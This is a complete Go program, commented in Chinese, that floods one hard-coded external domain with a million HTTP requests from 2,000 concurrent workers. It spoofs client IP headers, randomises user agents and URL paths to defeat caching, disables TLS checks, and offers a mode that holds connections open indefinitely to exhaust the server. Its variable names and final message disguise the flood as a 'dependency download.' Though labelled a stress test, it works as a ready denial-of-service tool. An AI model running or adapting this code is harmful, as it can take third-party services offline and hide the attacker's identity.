package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// 配置常量
const (
	TotalDownloads       = 1000000
	NumConcurrentWorkers = 2000
	DependencyURL        = "http://mahav-cbf.info/" // 请修改为您的目标URL
)

// 测试模式
type TestMode int

const (
	ModeNormal TestMode = iota // 正常模式：发送请求并接收响应
	ModeHangUp                 // 挂起模式：仅发送请求，不读取响应，保持连接
)

// 统计信息结构体
type Stats struct {
	TotalRequests      int64
	TotalResponses     int64
	Non200Responses    int64
	FailedRequests     int64
	TotalResponseSize  int64
	HangingConnections int64 // 挂起的连接数
}

// User-Agent 模板
var userAgentTemplates = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/%s Safari/605.1.15",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:%s) Gecko/20100101 Firefox/%s",
}

// HTTP方法列表
var httpMethods = []string{"GET", "POST", "PUT", "HEAD"}

// 生成随机User-Agent
func generateRandomUserAgent() string {
	template := userAgentTemplates[rand.Intn(len(userAgentTemplates))]
	version := fmt.Sprintf("%d.0.%d.%d", 
		rand.Intn(41)+80,  // 80-120
		rand.Intn(9000)+1000, // 1000-9999
		rand.Intn(900)+100)   // 100-999
	
	if strings.Contains(template, "Firefox") {
		return fmt.Sprintf(template, version, version)
	}
	return fmt.Sprintf(template, version)
}

// 生成随机IP地址
func generateRandomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d",
		rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))
}

// 生成随机负载数据
func generateRandomPayload() map[string]interface{} {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	length := rand.Intn(901) + 100 // 100-1000
	data := make([]byte, length)
	for i := range data {
		data[i] = chars[rand.Intn(len(chars))]
	}
	return map[string]interface{}{"data": string(data)}
}

// 生成随机URL
func generateRandomURL() string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	suffix := make([]byte, 25)
	for i := range suffix {
		suffix[i] = chars[rand.Intn(len(chars))]
	}
	return DependencyURL + string(suffix)
}

// 执行HTTP请求
func makeRequest(client *http.Client, method, url string, stats *Stats, mode TestMode, hangingConns chan *http.Response) {
	// 创建请求
	var req *http.Request
	var err error
	
	if method == "POST" || method == "PUT" {
		payload := generateRandomPayload()
		jsonData, _ := json.Marshal(payload)
		req, err = http.NewRequest(method, url, bytes.NewBuffer(jsonData))
		if err != nil {
			atomic.AddInt64(&stats.FailedRequests, 1)
			fmt.Printf("Failed to create request: %v\n", err)
			return
		}
		req.Header.Set("Content-Type", "application/json")
	} else {
		req, err = http.NewRequest(method, url, nil)
		if err != nil {
			atomic.AddInt64(&stats.FailedRequests, 1)
			fmt.Printf("Failed to create request: %v\n", err)
			return
		}
	}
	
	// 设置请求头
	req.Header.Set("User-Agent", generateRandomUserAgent())
	req.Header.Set("X-Real-IP", generateRandomIP())
	req.Header.Set("X-Forwarded-For", generateRandomIP())
	req.Header.Set("Remote-Addr", generateRandomIP())
	
	// 执行请求
	resp, err := client.Do(req)
	if err != nil {
		atomic.AddInt64(&stats.FailedRequests, 1)
		fmt.Printf("Request failed: %v\n", err)
		return
	}
	
	atomic.AddInt64(&stats.TotalRequests, 1)
	
	switch mode {
	case ModeNormal:
		// 正常模式：读取响应并关闭连接
		defer resp.Body.Close()
		
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			atomic.AddInt64(&stats.FailedRequests, 1)
			return
		}
		
		atomic.AddInt64(&stats.TotalResponseSize, int64(len(body)))
		
		if resp.StatusCode != 200 {
			atomic.AddInt64(&stats.Non200Responses, 1)
			fmt.Printf("Request failed with status code: %d\n", resp.StatusCode)
		} else {
			atomic.AddInt64(&stats.TotalResponses, 1)
		}
		
	case ModeHangUp:
		// 挂起模式：不读取响应内容，不关闭连接，让连接挂起
		atomic.AddInt64(&stats.HangingConnections, 1)
		// 将响应放入通道，由外部管理连接生命周期
		select {
		case hangingConns <- resp:
			// 成功放入通道
		default:
			// 通道满了，直接关闭这个连接
			resp.Body.Close()
		}
	}
}

// 工作协程
func worker(client *http.Client, urlChan <-chan string, stats *Stats, method string, mode TestMode, hangingConns chan *http.Response, wg *sync.WaitGroup) {
	defer wg.Done()
	
	for url := range urlChan {
		makeRequest(client, method, url, stats, mode, hangingConns)
	}
}

func main() {
	// 初始化随机种子
	rand.Seed(time.Now().UnixNano())
	
	// 选择随机HTTP方法
	method := httpMethods[rand.Intn(len(httpMethods))]
	
	// 选择测试模式
	// ModeNormal: 正常模式，发送请求并接收响应
	// ModeHangUp: 挂起模式，仅发送请求不接收响应，保持连接挂起
	mode := ModeNormal // 可以修改为 ModeNormal 切换模式
	
	fmt.Printf("开始压力测试...\n")
	fmt.Printf("目标URL: %s\n", DependencyURL)
	fmt.Printf("HTTP方法: %s\n", method)
	fmt.Printf("测试模式: %s\n", func() string {
		if mode == ModeHangUp {
			return "挂起模式 (仅发送请求，不接收响应)"
		}
		return "正常模式 (发送请求并接收响应)"
	}())
	fmt.Printf("总请求数: %d\n", TotalDownloads)
	fmt.Printf("并发数: %d\n", NumConcurrentWorkers)
	
	// 初始化统计
	stats := &Stats{}
	
	// 创建挂起连接管理通道
	var hangingConns chan *http.Response
	if mode == ModeHangUp {
		// 创建一个较大的缓冲通道来存储挂起的连接
		hangingConns = make(chan *http.Response, TotalDownloads)
	}
	
	// 创建高性能HTTP客户端
	transport := &http.Transport{
		MaxIdleConns:        10000,
		MaxIdleConnsPerHost: 2000,  // 增加单个host的最大连接数
		MaxConnsPerHost:     5000,  // 增加单个host的最大连接数
		IdleConnTimeout:     300 * time.Second, // 增加空闲连接超时时间
		DisableKeepAlives:   false,
		DisableCompression:  true,  // 禁用压缩以减少CPU使用
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}
	
	// 根据模式调整客户端配置
	var client *http.Client
	if mode == ModeHangUp {
		// 挂起模式：设置很长的超时时间，让连接保持挂起
		client = &http.Client{
			Transport: transport,
			Timeout:   300 * time.Second, // 设置很长的超时时间
		}
	} else {
		// 正常模式：正常的超时时间
		client = &http.Client{
			Transport: transport,
			Timeout:   30 * time.Second,
		}
	}
	
	// 创建URL通道
	urlChan := make(chan string, NumConcurrentWorkers*2)
	
	// 启动工作协程
	var wg sync.WaitGroup
	for i := 0; i < NumConcurrentWorkers; i++ {
		wg.Add(1)
		go worker(client, urlChan, stats, method, mode, hangingConns, &wg)
	}
	
	// 记录开始时间
	startTime := time.Now()
	
	// 生成并发送URL到通道
	go func() {
		defer close(urlChan)
		for i := 0; i < TotalDownloads; i++ {
			url := generateRandomURL()
			urlChan <- url
		}
	}()
	
	// 启动进度监控
	ctx, cancel := context.WithCancel(context.Background())
	go func() {
		ticker := time.NewTicker(5 * time.Second)
		defer ticker.Stop()
		
		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				completed := atomic.LoadInt64(&stats.TotalRequests)
				elapsed := time.Since(startTime)
				rate := float64(completed) / elapsed.Seconds()
				
				if mode == ModeHangUp {
					hanging := atomic.LoadInt64(&stats.HangingConnections)
					fmt.Printf("进度: %d/%d (%.1f%%) - 速度: %.0f req/s - 挂起连接: %d\n", 
						completed, TotalDownloads, 
						float64(completed)/float64(TotalDownloads)*100, rate, hanging)
				} else {
					fmt.Printf("进度: %d/%d (%.1f%%) - 速度: %.0f req/s\n", 
						completed, TotalDownloads, 
						float64(completed)/float64(TotalDownloads)*100, rate)
				}
			}
		}
	}()
	
	// 启动挂起连接管理器（仅在挂起模式下）
	if mode == ModeHangUp {
		go func() {
			fmt.Printf("启动连接挂起管理器...\n")
			// 这里可以根据需要管理挂起的连接
			// 例如：定期检查连接状态，或在需要时关闭部分连接
			hangingConnections := make([]*http.Response, 0)
			
			for resp := range hangingConns {
				hangingConnections = append(hangingConnections, resp)
				// 可以在这里添加连接管理逻辑
				// 比如当连接数达到某个阈值时，关闭一些旧连接
			}
		}()
	}
	
	// 等待所有工作完成
	wg.Wait()
	cancel()
	
	// 计算总用时
	elapsed := time.Since(startTime)
	
	// 输出统计结果
	totalTrafficGB := float64(atomic.LoadInt64(&stats.TotalResponseSize)) / (1024 * 1024 * 1024)
	avgRate := float64(atomic.LoadInt64(&stats.TotalRequests)) / elapsed.Seconds()
	
	fmt.Printf("\n=== 测试完成 ===\n")
	fmt.Printf("测试模式: %s\n", func() string {
		if mode == ModeHangUp {
			return "挂起模式"
		}
		return "正常模式"
	}())
	fmt.Printf("总耗时: %v\n", elapsed)
	fmt.Printf("平均速度: %.0f req/s\n", avgRate)
	fmt.Printf("总请求次数: %d\n", atomic.LoadInt64(&stats.TotalRequests))
	
	if mode == ModeHangUp {
		fmt.Printf("挂起连接数: %d\n", atomic.LoadInt64(&stats.HangingConnections))
		fmt.Printf("注意: 挂起的连接将保持打开状态，直到程序退出或服务器关闭连接\n")
	} else {
		fmt.Printf("成功响应次数: %d\n", atomic.LoadInt64(&stats.TotalResponses))
		fmt.Printf("非200响应次数: %d\n", atomic.LoadInt64(&stats.Non200Responses))
		fmt.Printf("总响应流量: %.2f GB\n", totalTrafficGB)
	}
	
	fmt.Printf("请求异常次数: %d\n", atomic.LoadInt64(&stats.FailedRequests))
	fmt.Printf("依赖下载完成\n")
	
	if mode == ModeHangUp {
		// 关闭挂起连接的通道
		close(hangingConns)
		fmt.Printf("程序将保持运行以维持挂起的连接，按 Ctrl+C 退出...\n")
		
		// 保持程序运行，维持挂起的连接
		select {} // 永久阻塞
	}
}
